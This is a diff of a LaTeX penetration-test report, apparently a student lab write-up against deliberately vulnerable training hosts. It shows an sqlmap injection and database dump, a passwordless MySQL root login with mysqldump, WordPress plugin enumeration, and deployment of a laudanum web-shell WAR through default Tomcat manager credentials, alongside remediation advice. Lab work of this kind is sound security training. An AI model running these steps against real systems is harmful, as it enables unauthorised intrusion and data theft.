@@ -198,7 +198,7 @@ and found a page called "SQL Injection".
 This page contained a single text box used for searching for a specific user by their id.
 When you enter a user id and click on submit, this page would send a GET request to 
 
-\begin{lstlisting}
+\begin{lstlisting}[basicstyle=\tiny]
 GET http://metasploitable.sait230.ca/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#
 \end{lstlisting}
 
@@ -216,7 +216,7 @@ returns does not mark the cookie as HTTPOnly, making it accessible via javascrip
 With a valid URL and Session cookie I can now use SQLMap to test out sql injection attacks.
 I was able to get a dump of the database exported as csv files.
 
-\begin{lstlisting}[language=Bash]
+\begin{lstlisting}[language=Bash,basicstyle=\tiny]
 \./sqlmap.py -u "http://metasploitable.sait230.ca/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=40ae620791b3658e5ee7eaaefbef49dc;" --tables
 sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
 ---
@@ -243,8 +243,8 @@ SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lZPr'='lZPr&Submit=Submit
 
 Here's a listing of the files:
 
-\begin{lstlisting}[language=Bash]
-root@bt-was:/pentest/database/sqlmap# tree -L 1 output/metasploitable.sait230.ca/dump/ | less
+\begin{lstlisting}[language=Bash,basicstyle=\tiny]
+root@bt-was:/pentest/database/sqlmap# tree -L 1 output/metasploitable.sait230.ca/dump/
 output/metasploitable.sait230.ca/dump/
 ├── dvwa
 ├── information\_schema
@@ -259,7 +259,6 @@ output/metasploitable.sait230.ca/dump/
 └── users.csv
 
 0 directories, 2 files
-
 \end{lstlisting}
 
 It looks like the dvwa web application running on bwa.sait230.ca was connecting to an
@@ -269,7 +268,7 @@ running from metasploitable.sait230.ca database server.
 
 \paragraph{Recommendation}
 
-Validate all user input. Use a different mysql account for each web application.
+Validate all user input. Use a different mysql accounts for each web application.
 Consider hosting each database on a separate database server.
 
 \newpage
@@ -284,10 +283,10 @@ Consider hosting each database on a separate database server.
 
 \paragraph{MySQL}
 Port 3306 is open on this host. This port
-is used by mysql. I connected to this port using the mysql client and
-using the default mysql installation user `root' without a password.
+is used by MySQL. I connected to this port using the MySQL client and
+used the default mysql installation user `root' without a password.
 
-\begin{lstlisting}
+\begin{lstlisting}[basicstyle=\tiny]
 root@bt-was:~# mysql -uroot -h metasploitable.sait230.ca
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 36239
@@ -324,15 +323,16 @@ account. This gave me full access to all databases on the database server.
 
 I used mysqldump to get a dump of all the databases on this host for offline analysis.
 
-\begin{lstlisting}
+\begin{lstlisting}[basicstyle=\tiny]
 root@bt-was:~# mysqldump -uroot -h metasploitable.sait230.ca \
   --all-databases > all-databases.sql
 \end{lstlisting}
 
+\newpage
 With full root access and a mysql shell I can insert rows into any table in any database.
 I can update any record and I can read all information in all tables.
 
-\begin{lstlisting}[language=SQL]
+\begin{lstlisting}[language=SQL,basicstyle=\tiny]
 mysql> use dvwa
 Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
@@ -397,7 +397,7 @@ Create firewall rules to filter which hosts can connect to the MySQL server.
 
 \paragraph{Wordpress}
 
-Using wpscan we can scan this wordpress installation to find a list of installed plugins.
+Using wpscan we scanned this wordpress installation to find a list of installed plugins.
 
 \begin{lstlisting}[language=Bash, firstline=26, lastline=39]
 root@bt-was:/pentest/web/wpscan# ./wpscan.rb --url bwa.sait230.ca/wordpress --enumerate p
@@ -506,7 +506,7 @@ Next I logged in to the wordpress site.
 \section{Default Tomcat Installation}
 
 \paragraph{Apache Tomcat}
-In the nikto scan we saw that the metasploitable box was using a defaul Apache
+In the nikto scan we saw that the metasploitable box was using a default Apache
 Tomcat installation:
 
 \begin{lstlisting}
@@ -533,8 +533,8 @@ Then click on Tomcat Manager and enter the default credentials.
 
 \newpage
 Now we can start and stop existing applications. We can upload our own WAR files.
-We can either craft a WAR file with a metasploit payload using msfvenom. In the 
-particular case I opted to use a laudanum cmd.war file.
+We can either craft a WAR file with a metasploit payload using msfvenom. 
+I used a laudanum cmd.war file for upload.
 
 %\begin{figure}[h!]
 %	\includegraphics[width=\linewidth]{images/tomcat-metasploitable-deploy.png}
@@ -666,7 +666,7 @@ My main focus was to identify ports used for hosting web applications and databa
 The significant open ports to note are 80, 443, 8080, 3306, 5432.
 
 Ports 80, 443 are typically used by web servers for serving HTTP traffic.
-8080 is usually used by backend application servers and typically bind to the 127.0.0.1
+8180 is usually used by back end application servers and typically bind to the 127.0.0.1
 interface. In the table above we can see that on the bwa host Apache Tomcat is binding 
 to interface 0.0.0.0 making it directly accessible from outside the host.
 
